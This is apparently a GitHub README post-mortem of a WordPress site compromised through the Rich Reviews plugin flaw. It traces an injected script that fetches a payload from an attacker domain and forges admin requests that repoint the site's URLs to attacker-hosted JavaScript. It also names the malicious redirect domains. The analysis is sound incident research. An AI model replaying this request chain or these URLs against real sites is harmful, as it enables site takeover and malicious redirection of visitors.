# Belaterwashere

This repo represents some work done to understand an attack on a wordpress site.

## Current post mortem:

### Initial attack vector
- publicly disclosed vulnerability in the `Rich Reviews` plugin used on the word press site
  - Disclosure at Wordfence here: [https://www.wordfence.com/blog/2019/09/rich-reviews-plugin-vulnerability-exploited-in-the-wild/](https://www.wordfence.com/blog/2019/09/rich-reviews-plugin-vulnerability-exploited-in-the-wild/)
  - this allow the attacker to modify options to inject a script onto the page
  - the script then downloaded an additional payload from `https://capital.belaterbewasthere.com/len.php`
  - This script would detect whether the user was logged in or not and then perform further action
  - __Logged in__
    - `GET /wp-admin/options-general.php` on the current domain
      - identify and extract the `wpnonce` from the response (for CSRF)
    - `POST /wp-admin/options.php` on current domain
      - referrer set to `/wp-admin/options-general.php`
      - data is: 
      ```js
      {
        'action': "update",
        '_wpnonce': nonce,
        '_wp_http_referer': "/wp-admin/options-general.php",
        'option_page': "general",
        'siteurl': "https://bes.belaterbewasthere.com/reserv//t3.js?",
        'home': "https://bes.belaterbewasthere.com/reserv/a3.js?"
      },
      ```
      (note: `https://bes.belaterbewasthere.com/reserv//t3.js?` is not a typo)
    - `POST /wp-admin/admin-ajax.php` on current domain
      - data : `{"action": "fake", "permalink_structure": 1}`
    - Force page reload by appending `&reload=1` to `window.location`
  - __Not Logged in__
    - User page is stopped and redirected via `https://capital.belaterbewasthere.com/len.php?s=678&_id=129843478&utm=gfhklew45`
    - User navigated to a domain which pretends to be a human verification and askes the user to accept notifications
      - Two domains have been seen for this:
        - `https://redrelaxfollow.com`
        - `https://greenrelaxfollow.com`
      - Unsure as to the intended "attack" at this point. Possibly just advertisment injection at a later date.

## Additional notes

Multiple other sites have been hit with the same attack, as seen by a [quick google search](https://www.google.com/search?q=belaterbewasthere&oq=belaterbewasthere) or in the screenshot below:
<details>
    <summary><a href="./Assets/OtherAffectedPages.png"> Assets/OtherAffectedPages.png</a></summary>
    <img src=./Assets/OtherAffectedPages.png alt="Google search of malicious domain name"/>
</details>

## Contact
If you would like more information or just want to discuss things, feel free to ping me here or [on twitter](https://twitter.com/E314cRael)

Please feel free to use this "research" for discussions, content and further research, but please make an acknowledgement in the material and link here.
